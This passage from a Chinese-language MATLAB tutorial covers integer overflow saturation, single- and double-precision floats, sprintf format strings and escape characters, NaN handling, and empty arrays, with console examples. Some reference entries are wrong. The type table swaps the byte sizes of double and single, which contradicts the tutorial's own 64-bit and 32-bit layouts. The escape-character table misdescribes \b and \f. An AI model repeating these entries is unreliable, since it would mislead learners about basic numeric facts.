class="hljs-number">5</span>   <span class="hljs-number">10</span>    <span class="hljs-number">9</span>    <span class="hljs-number">6</span>    <span class="hljs-number">8</span>   <span class="hljs-number">11</span><br><br>&gt;&gt; k-m  <span class="hljs-comment">%减法</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">-5</span>   <span class="hljs-number">-1</span>   <span class="hljs-number">-4</span>   <span class="hljs-number">-1</span>    <span class="hljs-number">4</span>    <span class="hljs-number">4</span>    <span class="hljs-number">3</span><br><br>&gt;&gt; k.*m  <span class="hljs-comment">%元素与元素相乘</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">6</span>    <span class="hljs-number">6</span>   <span class="hljs-number">21</span>   <span class="hljs-number">20</span>    <span class="hljs-number">5</span>   <span class="hljs-number">12</span>   <span class="hljs-number">28</span><br><br>&gt;&gt; k./m  <span class="hljs-comment">%元素与元素相除</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">0</span>   <span class="hljs-number">1</span>   <span class="hljs-number">0</span>   <span class="hljs-number">1</span>   <span class="hljs-number">5</span>   <span class="hljs-number">3</span>   <span class="hljs-number">2</span><br><br>&gt;&gt; k  <span class="hljs-comment">%重新输出</span><br>k =<br>   <span class="hljs-number">1</span>   <span class="hljs-number">2</span>   <span class="hljs-number">3</span>   <span class="hljs-number">4</span>   <span class="hljs-number">5</span>   <span class="hljs-number">6</span>   <span class="hljs-number">7</span><br><br>&gt;&gt; k/k(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">1</span>   <span class="hljs-number">1</span>   <span class="hljs-number">2</span>   <span class="hljs-number">2</span>   <span class="hljs-number">3</span>   <span class="hljs-number">3</span>   <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p><strong>多数情况下，整数的除法并不一定得到整数结果。</strong></p><h4 id="2-1-2-整数溢出"><a href="#2-1-2-整数溢出" class="headerlink" title="2.1.2 整数溢出"></a>2.1.2 整数溢出</h4><p>由于每种整数数据类型都有相应的取值范围，因此数学运算有可能产生结果溢出。MATLAB 利用饱和处理此类问题，即当运算结果超出了由 intmin 和 intmax 指定的上下限时，就将该结果设置为 intmin 或 intmax 的返回值，到底是哪一个，主要看溢出的方向。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; k=cast(<span class="hljs-string">&#x27;hellothere&#x27;</span>, <span class="hljs-string">&#x27;uint8&#x27;</span>)  <span class="hljs-comment">%将字符串转换为uint8类型</span><br>k =<br>   <span class="hljs-number">104</span>   <span class="hljs-number">101</span>   <span class="hljs-number">108</span>   <span class="hljs-number">108</span>   <span class="hljs-number">111</span>   <span class="hljs-number">116</span>   <span class="hljs-number">104</span>   <span class="hljs-number">101</span>   <span class="hljs-number">114</span>   <span class="hljs-number">101</span><br><br>&gt;&gt; double(k)+<span class="hljs-number">150</span>  <span class="hljs-comment">%double类型的加法</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">254</span>   <span class="hljs-number">251</span>   <span class="hljs-number">258</span>   <span class="hljs-number">258</span>   <span class="hljs-number">261</span>   <span class="hljs-number">266</span>   <span class="hljs-number">254</span>   <span class="hljs-number">251</span>   <span class="hljs-number">264</span>   <span class="hljs-number">251</span><br><br>&gt;&gt; k+<span class="hljs-number">150</span>  <span class="hljs-comment">%uint8类型的加法，向上溢出</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">254</span>   <span class="hljs-number">251</span>   <span class="hljs-number">255</span>   <span class="hljs-number">255</span>   <span class="hljs-number">255</span>   <span class="hljs-number">255</span>   <span class="hljs-number">254</span>   <span class="hljs-number">251</span>   <span class="hljs-number">255</span>   <span class="hljs-number">251</span><br><br>&gt;&gt; k<span class="hljs-number">-110</span>  <span class="hljs-comment">%uint8类型的减法，向下溢出</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">1</span>   <span class="hljs-number">6</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>混合数据类型的运算仅限于在一个双精度标量和一个整数数据类型数组之间进行。整数数据类型中不存在双精度数据类型中常见的 inf 和 NaN。除 64 位整数数据类型外，其他整数数据类型都具有比双精度类型更高的存储效率。基于同一整数数据类型的数学运算将产生相同数据类型的结果。</p><h3 id="2-2-浮点类型"><a href="#2-2-浮点类型" class="headerlink" title="2.2 浮点类型"></a>2.2 浮点类型</h3><p>MATLAB 用双精度或单精度格式表示浮点数，默认格式是双精度，但可以用转换函数转换为单精度。如果某个数据没有被指定数据类型，那么 MATLAB 会用双精度浮点数来存储它。为了得到其他类型的数值类型，可以使用类型转换函数。MATLAB 中的双精度浮点数和单精度浮点数均采用 IEEE 754 中规定的格式来定义。</p><table><thead><tr><th align="center">数据类型名称</th><th align="center">存储大小</th><th align="center">表示范围</th><th>类型转换函数</th></tr></thead><tbody><tr><td align="center"><code>双精度</code>浮点数</td><td align="center">4 字节</td><td align="center">-1.79769 × 10<sup>308</sup> ~+ 1.79769 ×10<sup>308</sup></td><td><code>double()</code></td></tr><tr><td align="center"><code>单精度</code>浮点数</td><td align="center">8 字节</td><td align="center">-3.40282 × 10<sup>38</sup> ~+ 3.40282 × 10<sup>38</sup></td><td><code>single()</code></td></tr></tbody></table><h4 id="2-2-1-双精度浮点数"><a href="#2-2-1-双精度浮点数" class="headerlink" title="2.2.1 双精度浮点数"></a>2.2.1 双精度浮点数</h4><p>MATLAB 按照 IEEE 754 标准构造双精度型数据。作为双精度存储的任何数据，都需要 64 位。</p><table><thead><tr><th align="center">位</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">63</td><td align="center">符号，0 = 正，1 = 负</td></tr><tr><td align="center">62~52</td><td align="center">指数，偏差值为 1023</td></tr><tr><td align="center">51~0</td><td align="center">数 1.f 的小数 f</td></tr></tbody></table><h5 id="2-2-1-1-建立双精度数"><a href="#2-2-1-1-建立双精度数" class="headerlink" title="2.2.1.1 建立双精度数"></a>2.2.1.1 建立双精度数</h5><p>因为 MATLAB 默认数值型数据是双精度类型，所以能够用最简单的赋值语句建立双精度数。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x = <span class="hljs-number">5.73</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">300</span><br>x = <br>    <span class="hljs-number">5.7300e+300</span><br></code></pre></div></td></tr></table></figure><p>可以用 isfloat() 函数用来验证X是一个双精度的浮点数。</p><h5 id="2-2-1-2-转换到双精度数"><a href="#2-2-1-2-转换到双精度数" class="headerlink" title="2.2.1.2 转换到双精度数"></a>2.2.1.2 转换到双精度数</h5><p>使用 double() 函数，可以把其他数值型数据、字符、字符串等转换成双精度。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; y = int64(<span class="hljs-number">-589324077574</span>);<br>&gt;&gt; x = double(y)<br>x = <br>    <span class="hljs-number">-5.8932e+11</span><br></code></pre></div></td></tr></table></figure><h5 id="2-2-1-3-最大和最小的双精度值"><a href="#2-2-1-3-最大和最小的双精度值" class="headerlink" title="2.2.1.3 最大和最小的双精度值"></a>2.2.1.3 最大和最小的双精度值</h5><p>MATLAB 的 realmax() 和 realmin() 函数返回能够表示的最大和最小双精度值。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; str = <span class="hljs-string">&#x27;The range for double is : \n\t%g to %g&#x27;</span>;<br>&gt;&gt; sprintf(str, <span class="hljs-built_in">realmin</span>, <span class="hljs-built_in">realmax</span>)<br><span class="hljs-built_in">ans</span> = <br>    The range <span class="hljs-keyword">for</span> double is:<br>        <span class="hljs-number">2.22507e-308</span> to <span class="hljs-number">1.79769e+308</span><br></code></pre></div></td></tr></table></figure><p>str 字符串的后半部分\n\t%g to %g用于规定输出格式，称其为格式字串（format string），这与 C语言基本相同。其中 \n 和 \t 是转义字符（Escape Character）；转义字符是一种特殊的字符常量，它们以反斜杠\开头，后面跟一个或几个字符。它们具有特定的含义，不同于字符原有的意义，故称“转义”字符。其他转义字符如表。</p><table><thead><tr><th align="center">转义字符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">\n</td><td align="center">换行，将当前位置移到下一行开头</td></tr><tr><td align="center">\t</td><td align="center">水平制表（跳到下一个 TAB 位置）</td></tr><tr><td align="center">\b</td><td align="center">退格，将当前位置移到本行的开头</td></tr><tr><td align="center">\r</td><td align="center">回车，将当前位置移到本行开头</td></tr><tr><td align="center">\f</td><td align="center">换页，将当前位置移到本行开头</td></tr><tr><td align="center">\\</td><td align="center">代表一个反斜杠字符“\”</td></tr><tr><td align="center">\‘</td><td align="center">代表一个单引号（撇号）字符</td></tr><tr><td align="center">\“</td><td align="center">代表一个双引号字符</td></tr><tr><td align="center">\ddd</td><td align="center">1 到 3 位八进制数所代表的 ASCII 字符</td></tr><tr><td align="center">\xhh</td><td align="center">1 到 2 位十六进制数所代表的的 ASCII 字符</td></tr></tbody></table><p>sprintf() 函数的作用是将规定输出格式的数值写入到字符串的 str 中，成为字符串 str 的一部分。其中 %g 是用于规定输出格式的字符串，称为格式转换字符（Conversion Character），其位置将被后面的 realmin() 和 realmax() 的值所取代。%g 规定输出格式是“紧凑指数形式”。常用的格式转换字符如表。</p><table><thead><tr><th align="center">格式转换字符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">%c</td><td align="center">单字符</td></tr><tr><td align="center">%d</td><td align="center">有符号的十进制数</td></tr><tr><td align="center">%e</td><td align="center">e 指数形式，欧拉数用小写（e）</td></tr><tr><td align="center">%E</td><td align="center">e 指数形式，欧拉数用大写（E）</td></tr><tr><td align="center">%f</td><td align="center">定点数形式</td></tr><tr><td align="center">%g</td><td align="center">%e 或 %f 的紧凑格式，不显示多余的零</td></tr><tr><td align="center">%G</td><td align="center">与 %g 相同，但用大写 E</td></tr><tr><td align="center">%o</td><td align="center">八进制（octal）数形式</td></tr><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%u</td><td align="center">十进制（decimal）数形式</td></tr><tr><td align="center">%x</td><td align="center">十六进制数形式，用小写字母 a~f</td></tr><tr><td align="center">%X</td><td align="center">十六进制数形式，用大写字母 A~F</td></tr></tbody></table><h4 id="2-2-2-单精度浮点数"><a href="#2-2-2-单精度浮点数" class="headerlink" title="2.2.2 单精度浮点数"></a>2.2.2 单精度浮点数</h4><p>MATLAB 按照 IEEE 754 标准构造单精度型数据。作为单精度存储的任何数据，都需要 32 位。</p><table><thead><tr><th align="center">位</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">31</td><td align="center">符号，0 = 正，1 = 负</td></tr><tr><td align="center">30 ~ 23</td><td align="center">指数，偏差值为 127</td></tr><tr><td align="center">22 ~ 0</td><td align="center">数 1.f 的小数 f</td></tr></tbody></table><p>单精度值依然使用 realmax() 和 realmin() 函数返回单精度能够表示的最大值和最小值，只是调用时要有参数single。</p><blockquote><ol><li>建立单精度数必须使用 single() 函数建立单精度数。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x = single(<span class="hljs-number">25.783</span>);<br>&gt;&gt; whos x<br>    Name    Size    Bytes  Class      Attributes<br>    x       <span class="hljs-number">1</span>x1         <span class="hljs-number">4</span>  single<br></code></pre></div></td></tr></table></figure><p>同样，用 single 函数能将其他数字、字符、字串和逻辑等类型的数转换成单精度数。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;single&#x27;</span>)  <span class="hljs-comment">%指定数据类型作为最后一个参数</span><br>a =<br>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span><br><br>&gt;&gt; b=<span class="hljs-built_in">eye</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;single&#x27;</span>)  <span class="hljs-comment">%指定数据类型作为最后一个参数</span><br>b =<br>    <span class="hljs-number">1</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span><br>   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">0</span><br>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">1</span><br><br>&gt;&gt; c=single(<span class="hljs-number">1</span>:<span class="hljs-number">7</span>)  <span class="hljs-comment">%将默认双精度转换为单精度</span><br>c =<br>    <span class="hljs-number">1</span>    <span class="hljs-number">2</span>    <span class="hljs-number">3</span>    <span class="hljs-number">4</span>    <span class="hljs-number">5</span>    <span class="hljs-number">6</span>    <span class="hljs-number">7</span><br><br>&gt;&gt; d=cast(<span class="hljs-number">6</span>:<span class="hljs-number">-1</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;single&#x27;</span>)  <span class="hljs-comment">%使用更通用的cast函数</span><br>d =<br>    <span class="hljs-number">6</span>    <span class="hljs-number">5</span>    <span class="hljs-number">4</span>    <span class="hljs-number">3</span>    <span class="hljs-number">2</span>    <span class="hljs-number">1</span>    <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>单精度数据之间或单精度与双精度数据之间的数学运算结果将为单精度数。(接上面代码)</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; c.^d<br><span class="hljs-built_in">ans</span> =<br>     <span class="hljs-number">1</span>    <span class="hljs-number">32</span>    <span class="hljs-number">81</span>    <span class="hljs-number">64</span>    <span class="hljs-number">25</span>     <span class="hljs-number">6</span>     <span class="hljs-number">1</span><br><br>&gt;&gt; c*<span class="hljs-built_in">pi</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">3.1416</span>    <span class="hljs-number">6.2832</span>    <span class="hljs-number">9.4248</span>   <span class="hljs-number">12.5664</span>   <span class="hljs-number">15.7080</span>   <span class="hljs-number">18.8496</span>   <span class="hljs-number">21.9911</span><br><br>&gt;&gt; d.*<span class="hljs-built_in">rand</span>(<span class="hljs-built_in">size</span>(d))<br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">5.0443</span>    <span class="hljs-number">1.2714</span>    <span class="hljs-number">3.2571</span>    <span class="hljs-number">0.7306</span>    <span class="hljs-number">1.8585</span>    <span class="hljs-number">0.3500</span>    <span class="hljs-number">0</span><br><br>&gt;&gt; class(<span class="hljs-built_in">ans</span>)<br><span class="hljs-built_in">ans</span> =<br>    single<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>单精度数据类型中包含双精度数据类型中常见的特殊浮点值 inf 和 NaN。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; c =<br>     <span class="hljs-number">0</span>     <span class="hljs-number">2</span>     <span class="hljs-number">0</span>     <span class="hljs-number">4</span>     <span class="hljs-number">0</span>     <span class="hljs-number">6</span>     <span class="hljs-number">0</span><br><br>&gt;&gt; c./c<br><span class="hljs-built_in">ans</span> =<br>    NaN     <span class="hljs-number">1</span>   NaN     <span class="hljs-number">1</span>   NaN     <span class="hljs-number">1</span>   NaN<br><br>&gt;&gt; <span class="hljs-number">1.</span>/c<br><span class="hljs-built_in">ans</span> =<br>    Inf    <span class="hljs-number">0.5000</span>    Inf    <span class="hljs-number">0.2500</span>    Inf    <span class="hljs-number">0.1667</span>    Inf<br></code></pre></div></td></tr></table></figure><h3 id="2-3-NAN"><a href="#2-3-NAN" class="headerlink" title="2.3 NAN"></a>2.3 NAN</h3><p>NaN 是 Not a Number 的缩写，意思是“不是一个有效的数字”。MATLAB NaN 表示一个没有意义的数字，这种数字在数学上是无法定义的。NaN 一般是在没有意义的数学计算中得到的，比如 0/0，Inf/Inf，Inf-Inf，Inf*0。在处理不完整的数据时，这些数据也会被当做 NaN，比如在读取数字时，遇到的字符不是数字，就会被当做 NaN。</p><p>对 NaN 进行运算的结果仍然是 NaN。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-built_in">nan</span> <span class="hljs-built_in">inf</span> <span class="hljs-built_in">nan</span>]<br>a =<br>    <span class="hljs-number">1</span>    <span class="hljs-number">2</span>   NaN   Inf   NaN<br><br>&gt;&gt; b=<span class="hljs-number">2</span>*a<br>b =<br>    <span class="hljs-number">2</span>    <span class="hljs-number">4</span>   NaN   Inf   NaN<br><br>&gt;&gt; c=<span class="hljs-built_in">sqrt</span>(a)<br>c =<br>    <span class="hljs-number">1.0000</span>    <span class="hljs-number">1.4142</span>    NaN    Inf    NaN<br><br>&gt;&gt; d=(a==<span class="hljs-built_in">nan</span>)<br>d =<br>    <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br><br>&gt;&gt; f=(a~=<span class="hljs-built_in">nan</span>)<br>f =<br>    <span class="hljs-number">1</span>    <span class="hljs-number">1</span>    <span class="hljs-number">1</span>    <span class="hljs-number">1</span>    <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>第一条语句生成了一个含有 NaN 的向量 a，第二和第三条语句分别对 a 进行乘法和开方运算，从运算结果可以看到，对 NaN 进行数学运算的结果仍然是 NaN。第四条和第五条语句的结果或许有些出乎意料：a==nan 得到的结果全部都是 0（false），而 a～=nan 却得到了全部是 1（true）的结果。这一结果表明，在 MATLAB 中，不同的 NaN 之间是不相等的。鉴于 NaN 的这种特性，我们在进行关系运算时，就必须确定数组中是否含有 NaN。</p><h4 id="2-3-1-isnan-函数"><a href="#2-3-1-isnan-函数" class="headerlink" title="2.3.1 isnan() 函数"></a>2.3.1 isnan() 函数</h4><p>MATLAB 为我们提供了一个内置函数 isnan()，专门用来寻找数组中是否含有 NaN。<br>示例：利用 isnan() 函数寻找 a 中的 NaN。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; g=<span class="hljs-built_in">isnan</span>(a)<br>g =<br>    <span class="hljs-number">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">1</span>   <span class="hljs-number">0</span>   <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>isnan() 函数在数组中 NaN 的位置返回 1（true）。</p><p>将 isnan() 和 find() 函数联合使用可以寻找数组中 NaN 的位置索引。<br>示例：找到数组 a 中 NaN 的位置，然后在这些位置上用 0 替代 NaN。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">i</span>=<span class="hljs-built_in">find</span>(<span class="hljs-built_in">isnan</span>(a))  <span class="hljs-comment">%查找NaN的索引位置</span><br><span class="hljs-built_in">i</span> =<br>     <span class="hljs-number">3</span>     <span class="hljs-number">5</span><br><br>&gt;&gt; a(<span class="hljs-built_in">i</span>)=<span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(<span class="hljs-built_in">i</span>))  <span class="hljs-comment">%将NaN更改为zeros</span><br>a =<br>    <span class="hljs-number">1</span>    <span class="hljs-number">2</span>    <span class="hljs-number">0</span>    Inf    <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-空数组"><a href="#2-4-空数组" class="headerlink" title="2.4 空数组"></a>2.4 空数组</h3><p>MATLAB 空数组是开发人员定义的一个数据类型（这一点与 MATLAB NaN 不同，因为 NaN 是由 IEEE 标准定义的），它指有一维或多维的长度为 0 的数组变量。空数组的表达方式也很多，最简单的一种是直接用两个方括号表示的数组，即 [ ] 数组。</p><p>示例：几种空数组的创建方式，并用 size 或 length 查看了它们的维数或长度。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">size</span>([])  <span class="hljs-comment">%最简单的空数组</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span><br><br>&gt;&gt; c=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)  <span class="hljs-comment">%一个多列的空数组</span><br>c =<br>  空的 <span class="hljs-number">0</span>×<span class="hljs-number">5</span> double 矩阵<br><br>&gt;&gt; <span class="hljs-built_in">size</span>(c)<br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">0</span>    <span class="hljs-number">5</span><br><br>&gt;&gt; d=<span class="hljs-built_in">ones</span>(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment">%一个多行的空数组</span><br>d =<br>  空的 <span class="hljs-number">4</span>×<span class="hljs-number">0</span> double 矩阵<br><br>&gt;&gt; <span class="hljs-built_in">size</span>(d)<br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">4</span>    <span class="hljs-number">0</span><br><br>&gt;&gt; <span class="hljs-built_in">length</span>(d)  <span class="hljs-comment">%即使它有4行,但是它的长度还是为零，</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>使一个数组的维数为 0 也许会感到困惑，但这在许多运算中是非常有用的。空数组有时也出现在一些函数的返回参数中。在 MATLAB 中，很多函数在无法返回适当结果时，往往会返回空数组。</p><p>示例：使用  find() 函数 。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x=<span class="hljs-number">-2</span>:<span class="hljs-number">2</span><br>x =<br>    <span class="hljs-number">-2</span>    <span class="hljs-number">-1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span><br><br>&gt;&gt; y=<span class="hljs-built_in">find</span>(x&gt;<span class="hljs-number">2</span>)<br>y =<br>    空的 <span class="hljs-number">1</span>×<span class="hljs-number">0</span> double 行矢量<br></code></pre></div></td></tr></table></figure><p>数组 x 中不存在大于 2 的值，因此找不到正确的索引值，于是 find 就返回一个空数组。</p><blockquote><ul><li>使用 isempty() 函数测试一个返回值是否是空数组。</li></ul></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">isempty</span>(y)<br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>由于空数组也存在维数（如前面创建的 c 为 0×5 的数组），在 MATLAB 中，不同维数的空数组之间是不能进行比较的，因此，验证一个数组是否是空数组时，最好不要使用关系运算，建议使用 isempty() 函数。</p><p>示例：验证前面创建的 c 是否是空数组，只能采用 isempty() 函数。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; c==[]  <span class="hljs-comment">%用一个 0×5 的数组和一个 0×0 的数组比较会出错</span><br>错误使用  ==<br>矩阵维度必须一致。<br><br>&gt;&gt; <span class="hljs-built_in">isempty</span>(c)  <span class="hljs-comment">%isempty()返回所需的结果</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>当用户确认空数组是最简单的空数组 [ ] 时，关系运算也成立，只不过运算结果仍是空数组。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[];  <span class="hljs-comment">%创建空数组</span><br>&gt;&gt; a==[]  <span class="hljs-comment">%比较大小相等的空数组仍然会得到一个空数组</span><br><span class="hljs-built_in">ans</span> =<br>    []<br></code></pre></div></td></tr></table></figure><p>将一个非空数组与一个空数组进行比较，结果返回一个空数组。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; b=<span class="hljs-number">1</span>;  <span class="hljs-comment">%创建非空变量</span><br>&gt;&gt; b==[]  <span class="hljs-comment">%将非空变量与空变量进行比较会产生空结果</span><br><span class="hljs-built_in">ans</span> =<br>    []<br><br>&gt;&gt; b~=[]  <span class="hljs-comment">%即使不相等的比较也会产生空结果</span><br><span class="hljs-built_in">ans</span> =<br>    []<br></code></pre></div></td></tr></table></figure><p>对空数组执行关系运算时，要么返回一个错误信息（如在两个不同维数的空数组之间进行比较时），要么返回一个空数组（如前面的两个例子），这通常都不是我们想要的结果，因此，当有空数组出现时，建议用户使用 isempty() 函数，尽量不要使用关系运算。</p><h3 id="2-5-复数类型"><a href="#2-5-复数类型" class="headerlink" title="2.5 复数类型"></a>2.5 